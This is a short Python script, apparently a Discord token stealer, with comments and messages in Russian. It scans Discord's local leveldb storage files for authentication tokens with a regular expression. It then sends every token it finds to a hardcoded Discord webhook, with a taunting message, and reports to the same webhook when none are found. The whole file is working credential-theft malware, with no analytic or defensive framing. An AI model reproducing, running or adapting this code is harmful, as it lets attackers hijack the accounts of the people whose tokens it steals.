import os
import re
import json
import requests

# ТВОЙ КАНАЛ СВЯЗИ
WEBHOOK_URL = "https://discord.com/api/webhooks/1476227020403900496/s6ykJrNNhv4ytqhrIQa6qx_-OpDFPh0crlUIsvmE4inpGXMv6XqALyzusqd1B8mtO8WC"

def get_tokens():
    path = os.getenv('APPDATA') + r'\discord\Local Storage\leveldb'
    tokens = []
    if not os.path.exists(path): return []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        with open(f'{path}\\{file_name}', errors='ignore') as f:
            for line in f.readlines():
                for found in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line):
                    if found not in tokens:
                        tokens.append(found)
    return tokens

def void_launch():
    tokens = get_tokens()
    if not tokens:
        requests.post(WEBHOOK_URL, json={"content": "⚠️ [SYSTEM]: Цель пуста или защита активна."})
        return

    message = "☄️ **ПРИВЕТ ИЗ ПУСТОТЫ. ДАННЫЕ ПОЛУЧЕНЫ:**\n"
    for t in tokens:
        message += f"🔑 `Token`: {t}\n"
    
    requests.post(WEBHOOK_URL, json={"content": message})

if __name__ == "__main__":
    void_launch()
